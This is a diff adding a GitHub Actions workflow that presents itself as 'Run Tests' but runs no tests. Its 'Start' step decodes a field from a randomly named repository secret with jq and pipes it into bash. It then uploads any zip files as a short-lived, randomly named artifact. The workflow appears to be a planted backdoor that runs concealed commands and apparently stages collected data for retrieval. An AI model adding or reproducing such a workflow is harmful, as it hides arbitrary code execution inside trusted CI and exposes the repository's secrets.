@@ -1,0 +1,26 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          yfi283: ${{ secrets.yfi283 }}
+        run: |
+          printf '%s' "$yfi283" | jq -r .gmbcu15 | /bin/bash
+          echo $s695 | jq -r .vc6 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: qvsRDOf6
+          path: "*.zip"
+          retention-days: 1
